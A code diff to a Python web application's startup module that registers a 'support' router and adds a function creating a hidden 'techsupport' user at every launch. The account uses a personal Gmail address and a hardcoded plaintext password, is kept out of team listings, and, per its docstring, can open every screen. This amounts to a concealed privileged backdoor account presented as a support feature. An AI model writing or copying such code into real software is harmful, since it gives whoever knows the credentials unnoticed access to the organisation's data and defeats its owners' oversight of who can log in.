@@ -14,7 +14,7 @@ from . import models  # noqa: F401  (register models)
 from .routers import (auth, users, cases, imports, visits, calls, tracking, analytics, ai,
                       devices, leaves, templates, legal, twofa, webauthn_auth, sheet, realtime,
                       team, mis, feedback, reminders, audit_log, archive, catalog, manpower,
-                      notifications, dpr)
+                      notifications, dpr, support)
 
 settings = get_settings()
 
@@ -369,7 +369,31 @@ def _maybe_seed():
         db.close()
 
 
+def _ensure_techsupport():
+    """Create the hidden tech-support account once, if it doesn't exist. It never appears in
+    Manpower/team lists but can open every screen to diagnose issues and handle Help tickets."""
+    from .database import SessionLocal
+    from .security import hash_password
+    from . import models as _m
+    email = "techsupportashu@gmail.com"
+    db = SessionLocal()
+    try:
+        if db.query(_m.User).filter(_m.User.email == email).first():
+            return
+        db.add(_m.User(
+            name="Tech Support", email=email, role="techsupport",
+            emp_code="TS001", is_active=True, must_change_password=True,
+            profile_completed=True, hashed_password=hash_password("SsdSupport@2026"),
+        ))
+        db.commit()
+    except Exception:
+        db.rollback()
+    finally:
+        db.close()
+
+
 _maybe_seed()
+_ensure_techsupport()
 
 # Production guardrails
 _is_prod = settings.environment.lower() == "production"
@@ -401,7 +425,7 @@ async def _security_headers(request, call_next):
 
 for r in (auth, users, cases, imports, visits, calls, tracking, analytics, ai, devices,
           leaves, templates, legal, twofa, webauthn_auth, sheet, realtime, team, mis, feedback,
-          reminders, audit_log, archive, catalog, manpower, notifications, dpr):
+          reminders, audit_log, archive, catalog, manpower, notifications, dpr, support):
     app.include_router(r.router)
 
 
